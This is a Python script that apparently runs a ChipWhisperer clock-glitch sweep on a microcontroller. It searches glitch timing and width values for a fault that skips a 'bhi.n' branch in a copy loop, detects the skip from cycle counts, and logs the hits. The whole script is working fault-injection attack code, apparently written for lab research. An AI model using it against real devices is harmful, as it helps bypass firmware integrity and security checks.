#!/usr/bin/env python3
"""Follow up the ext=82 lead. A clean bhi.n skip at byte j gives
dcyc = -32*(136-j) - 1  ->  dcyc < 0 and dcyc % 32 == 31.
Fine width granularity around 36 (the one width that produced the lead),
repeat 1 first (one edge, no second instruction perturbed), N attempts each."""
import csv, itertools, argparse
from collections import Counter
from cwcommon import connect, arm_glitch, reboot, parse, classify
ap = argparse.ArgumentParser()
ap.add_argument("--ext_min",  type=int, default=74)
ap.add_argument("--ext_max",  type=int, default=92)
ap.add_argument("--base_cyc", type=int, default=45181)
ap.add_argument("--tries",    type=int, default=5)
a = ap.parse_args()

scope, target = connect(); arm_glitch(scope)
PS = scope.glitch.phase_shift_steps
def settable(attr, vals):
    ok=[]
    for v in vals:
        try: setattr(scope.glitch, attr, v); ok.append(v)
        except Exception: pass
    return ok
WIDTHS  = settable('width',  [9,14,18,23,27,32,36,41,45,50,55,64,73,91])
OFFSETS = settable('offset', [int(-0.05*PS), int(-0.15*PS)])
REPEATS = (1,2,3)
print(f"widths  : {WIDTHS}")
print(f"offsets : {OFFSETS}")
n_total=(a.ext_max-a.ext_min+1)*len(WIDTHS)*len(OFFSETS)*len(REPEATS)*a.tries
print(f"attempts: {n_total}\n")

rows, crash, n, clean = [], Counter(), 0, 0
for eo,wd,of,rp,_ in itertools.product(range(a.ext_min,a.ext_max+1),
                                       WIDTHS, OFFSETS, REPEATS, range(a.tries)):
    scope.glitch.ext_offset=eo; scope.glitch.width=wd
    scope.glitch.offset=of;     scope.glitch.repeat=rp
    scope.arm(); target.simpleserial_write('r', b'')
    to = scope.capture()
    d = parse(None if to else target.simpleserial_read('r', 19, timeout=2000))
    n += 1
    if d is None:        crash[eo]+=1; reboot(scope); continue
    if d == 'BAD_FRAME': continue
    cls, dcyc = classify(d[0]), d[1]-a.base_cyc
    sig = dcyc < -30 and (dcyc % 32) in (30,31,0)        # truncation ladder
    if cls=='normal' and abs(dcyc)<=10 and not sig: continue
    rows.append((eo,wd,of,rp,cls,d[0].hex(),d[1],dcyc,d[2],d[3],d[4]))
    if cls.startswith('INNER'):
        clean += 1
        j = int(cls.split('stop')[1])
        ok = 'MATCHES' if abs(dcyc-(-32*(136-j)-1))<=2 else 'cycle MISMATCH'
        print(f"  *** CLEAN bhi.n SKIP  ext={eo} w={wd} off={of} rep={rp}  {cls}  dcyc={dcyc:+6d}  [{ok}]")
    elif sig:
        print(f"  ext={eo:4d} w={wd:4d} off={of:5d} rep={rp}  dcyc={dcyc:+6d}  "
              f"-> j={(136*32+dcyc+1)//32:3d} bytes copied, digest unmatched  {d[0].hex()}")
    if n % 2000 == 0: print(f"    ...{n}/{n_total}, {len(rows)} hits, {sum(crash.values())} crashes")

with open("hunt_bhi2.csv","w",newline="") as f:
    w=csv.writer(f)
    w.writerow(["ext_offset","width","offset","repeat","class","out8","cyc","dcyc","cpi","lsu","fold"])
    w.writerows(rows)
lad=[r for r in rows if r[7]<-30 and (r[7]%32) in (30,31,0)]
print(f"\n=== {n} attempts, {len(rows)} hits, {sum(crash.values())} crashes ===")
print(f"CLEAN bhi.n skips (INNER_*)      : {clean}")
print(f"truncation-ladder cycle signature: {len(lad)}")
for r in lad[:30]:
    print(f"  ext={r[0]:4d} w={r[1]:4d} off={r[2]:5d} rep={r[3]}  dcyc={r[7]:+6d}  {r[4]}  {r[5]}")
scope.dis(); target.dis()
